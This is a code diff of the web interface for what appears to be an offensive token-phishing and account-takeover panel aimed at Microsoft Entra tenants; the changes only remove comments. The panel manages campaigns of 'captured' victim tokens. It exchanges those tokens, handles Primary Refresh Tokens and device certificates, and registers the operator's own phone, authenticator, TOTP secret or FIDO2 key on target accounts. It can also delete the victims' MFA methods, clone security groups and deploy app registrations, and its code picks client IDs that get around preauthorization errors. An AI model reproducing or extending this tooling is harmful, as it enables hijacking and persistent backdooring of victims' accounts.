@@ -86,7 +86,7 @@
 </nav>
 
 <div class="layout">
-  <!-- Sidebar: section list -->
+  
   <div class="sidebar">
     <div class="sidebar-section">
       <div class="sidebar-label">Token Operations</div>
@@ -110,10 +110,10 @@
     </div>
   </div>
 
-  <!-- Main content -->
+  
   <div class="main" id="mainContent">
 
-    <!-- ─── Token Exchange ─── -->
+    
     <div id="sec-exchange" class="section-body active">
       <div class="panel">
         <div class="panel-title">🔄 Token Exchange</div>
@@ -169,7 +169,7 @@
       </div>
     </div>
 
-    <!-- ─── Tenant Lookup ─── -->
+    
     <div id="sec-tenant" class="section-body">
       <div class="panel">
         <div class="panel-title">🔍 Tenant ID Lookup</div>
@@ -184,7 +184,7 @@
       </div>
     </div>
 
-    <!-- ─── Device Certificates ─── -->
+    
     <div id="sec-devcerts" class="section-body">
       <div class="panel">
         <div class="panel-title">🖥 Device Certificates</div>
@@ -230,7 +230,7 @@
       </div>
     </div>
 
-    <!-- ─── Primary Refresh Tokens ─── -->
+    
     <div id="sec-prts" class="section-body">
       <div class="panel">
         <div class="panel-title">🔑 Primary Refresh Tokens</div>
@@ -288,7 +288,7 @@
       </div>
     </div>
 
-    <!-- ─── WinHello Keys ─── -->
+    
     <div id="sec-winhello" class="section-body">
       <div class="panel">
         <div class="panel-title">🪟 Windows Hello for Business Keys</div>
@@ -314,7 +314,7 @@
       </div>
     </div>
 
-    <!-- ─── MFA Management ─── -->
+    
     <div id="sec-mfa" class="section-body">
       <div class="panel">
         <div class="panel-title">📱 MFA Management</div>
@@ -348,19 +348,19 @@
           <button class="section-tab" onclick="mfaTab(this,'delete')">Delete</button>
         </div>
 
-        <!-- Registered — Graph beta/me/authentication/methods -->
+        
         <div id="mfatab-registered" class="section-body active">
           <p style="font-size:11px;color:var(--text-dim);margin:8px 0 10px">Methods <strong style="color:var(--text)">already registered</strong> on the account — Graph API <code>beta/me/authentication/methods</code>. Uses Graph token, not the MFA session. Method IDs shown here can be used in the Delete tab.</p>
           <button class="btn btn-primary" onclick="mfaGetRegistered()">↻ Load Registered Methods</button>
         </div>
 
-        <!-- Available — mysignins availablemethods -->
+        
         <div id="mfatab-available" class="section-body">
           <p style="font-size:11px;color:var(--text-dim);margin:8px 0 10px">Methods <strong style="color:var(--text)">allowed by tenant policy</strong> — My Sign-ins API <code>/authenticationmethods/availablemethods</code>. Requires MFA session.</p>
           <button class="btn btn-primary" onclick="mfaListMethods()">↻ Load Available Methods</button>
         </div>
 
-        <!-- Phone -->
+        
         <div id="mfatab-phone" class="section-body">
           <div class="input-row">
             <div class="input-group">
@@ -377,13 +377,13 @@
           <button class="btn btn-primary" onclick="mfaAddPhone()">▶ Add Phone</button>
         </div>
 
-        <!-- Email -->
+        
         <div id="mfatab-email" class="section-body">
           <div class="input-group"><label>EMAIL ADDRESS</label><input id="mfaEmail" type="text" placeholder="backup@email.com"></div>
           <button class="btn btn-primary" onclick="mfaAddEmail()">▶ Add Email</button>
         </div>
 
-        <!-- App -->
+        
         <div id="mfatab-app" class="section-body">
           <div class="input-row">
             <div class="input-group">
@@ -399,14 +399,14 @@
           <button class="btn btn-primary" onclick="mfaAddApp()">▶ Add Authenticator App</button>
         </div>
 
-        <!-- TOTP auto-register -->
+        
         <div id="mfatab-totp-register" class="section-body">
           <div class="input-group"><label>LABEL FOR STORAGE</label><input id="mfaTotpLabel" type="text" placeholder="target@contoso.com"></div>
           <p style="font-size:11px;color:var(--text-dim);margin-bottom:10px">Automatically registers this tool as an Authenticator OTP-only app, retrieves the secret key, generates a TOTP code, verifies it, and stores the secret locally.</p>
           <button class="btn btn-success" onclick="mfaRegisterTOTP()">▶ Register as TOTP App</button>
         </div>
 
-        <!-- FIDO2 Security Key -->
+        
         <div id="mfatab-fido2" class="section-body">
           <p style="font-size:11px;color:var(--text-dim);margin:8px 0 10px">Registers <strong style="color:var(--text)">your physical security key</strong> (FIDO2/WebAuthn) on the target account using the captured refresh token. The key must be physically connected to your machine — the browser's <code>navigator.credentials.create()</code> handles key interaction.</p>
           <div class="input-group"><label>KEY NAME / LABEL</label><input id="mfaFido2Name" type="text" placeholder="YubiKey 5C NFC"></div>
@@ -418,7 +418,7 @@
           <button class="btn btn-primary" onclick="mfaRegisterFIDO2()" id="mfaFido2Btn">🔑 Register Security Key</button>
         </div>
 
-        <!-- Delete -->
+        
         <div id="mfatab-delete" class="section-body">
           <p style="font-size:11px;color:var(--text-dim);margin:8px 0 8px">Copy the method ID from the <strong style="color:var(--text)">Registered</strong> tab output.</p>
           <div class="input-group"><label>METHOD ID</label><input id="mfaDeleteId" type="text" placeholder="00000000-0000-0000-0000-000000000000"></div>
@@ -429,7 +429,7 @@
       </div>
     </div>
 
-    <!-- ─── TOTP Generator ─── -->
+    
     <div id="sec-totp" class="section-body">
       <div class="panel">
         <div class="panel-title">⏱ TOTP Generator</div>
@@ -451,7 +451,7 @@
       </div>
     </div>
 
-    <!-- ─── Graph Actions ─── -->
+    
     <div id="sec-graph-actions" class="section-body">
       <div class="panel">
         <div class="panel-title">⚙ Graph Actions</div>
@@ -467,7 +467,7 @@
           </div>
         </div>
 
-        <!-- Clone Security Group -->
+        
         <div style="border:1px solid var(--border);border-radius:2px;margin-bottom:16px">
           <div style="padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent)">Clone Security Group</div>
           <div style="padding:14px">
@@ -490,7 +490,7 @@
           </div>
         </div>
 
-        <!-- Deploy App Registration -->
+        
         <div style="border:1px solid var(--border);border-radius:2px">
           <div style="padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent)">Deploy App Registration</div>
           <div style="padding:14px">
@@ -516,8 +516,8 @@
       </div>
     </div>
 
-  </div><!-- /main -->
-</div><!-- /layout -->
+  </div>
+</div>
 
 <script>
 // ─── Auth ─────────────────────────────────────────────────────────────────────
@@ -655,14 +655,12 @@ async function loadCampaignsForSelects() {
   }
 }
 
-// tokenMetaCache: campaignId → { targetId → {tenant_id, captured_client_id, ...} }
 const tokenMetaCache = {};
 
 async function _loadTargetsInto(selId, campaignId, metaCacheKey) {
   if (!campaignId) return;
   const data = await api('GET', '/campaigns/'+campaignId+'/tokens');
   const tokens = data.tokens || data || [];
-  // Cache metadata keyed by target_id
   const map = {};
   tokens.forEach(t => {
     const tid = t.targetId || t.target_id;
@@ -696,14 +694,12 @@ async function loadGaTargets() {
   await _loadTargetsInto('gaTargetId', cid, 'ga_'+cid);
 }
 
-// Auto-fill token exchange fields from captured token metadata
 function applyExTargetMeta() {
   const cid = document.getElementById('exCampaignId').value;
   const tid = document.getElementById('exTargetId').value;
   if (!cid || !tid) return;
   const meta = (tokenMetaCache['ex_'+cid] || {})[tid];
   if (!meta) return;
-  // Pre-fill client ID with the one that originally captured the token
   if (meta.captured_client_id) {
     document.getElementById('exClientId').value = meta.captured_client_id;
   }
@@ -770,9 +766,6 @@ async function loadDeviceCertsForSelects() {
   });
 }
 
-// ─── Token Exchange ───────────────────────────────────────────────────────────
-// clientIDs that work for specific presets where the campaign default (Office d3590ed6)
-// fails with AADSTS65002 (first-party ↔ first-party preauthorization required).
 const presetClientOverrides = {
   mfa_registration: '1b730954-1685-4b74-9bfd-dac224a7b894', // Azure PowerShell
 };
